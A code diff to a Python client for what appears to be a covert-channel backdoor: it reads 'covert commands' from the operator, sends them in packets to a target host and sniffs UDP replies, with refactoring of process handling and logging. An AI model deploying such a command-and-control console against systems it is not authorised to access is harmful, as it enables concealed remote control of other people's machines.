@@ -24,15 +24,15 @@
 import sys
 from client_utils import*
 from client_packet import*
-import threading
+import multiprocessing
 import getopt
-
+import datetime
 
 try:
     opts, args = getopt.getopt(sys.argv[1:], 'd:p:b:s:i:h', ['dest=', 'dport=', 'src=', 'sport=', 'interface=', 'help'])
 except getopt.GetoptError:
     usage()
-    sys.exit(2)
+    sys.exit(1)
 
 for opt, arg in opts:
     if opt in ('-h', '--help'):
@@ -57,17 +57,22 @@ if not packet['dest']:
     usage()
     sys.exit(2)
 
+try:
+    with open(FILENAME, 'a') as f:
+        f.write(datetime.datetime.now().strftime('Initiated Covert Console -- %I:%M:%S %b %d, %Y\n\n'))
+    # Setup filter and start sniffing for replies
+    packet_filter = "udp and src host {0}".format(packet['dest'])
+    sniff_process = multiprocessing.Process(target=sniff_packets, args=(packet_filter, ))
+    sniff_process.start()
 
-# Setup filter and start sniffing for replies
-packet_filter = "udp and dst port and (dst host {0})".format(packet['dest'])
-sniff_thread = threading.Thread(target=sniff_packets, args=(packet_filter, ))
-sniff_thread.start()
-
-# Get commands from user
-while 1:
-    packet['cmd'] = raw_input("\nPlease enter a covert command (or type \"quit\"): \n")
-    if packet['cmd'] == "quit":
-        stop_sniff = True
-        sys.exit(0)
-    send_packet(packet)
+    # Get commands from user
+    while 1:
+        packet['cmd'] = raw_input("\nPlease enter a covert command (or type \"quit\"): \n")
+        if packet['cmd'] == "quit":
+            sniff_process.terminate()
+            sys.exit(0)
+        send_packet(packet)
+except KeyboardInterrupt:
+    sniff_process.terminate()
+    sys.exit(1)
 
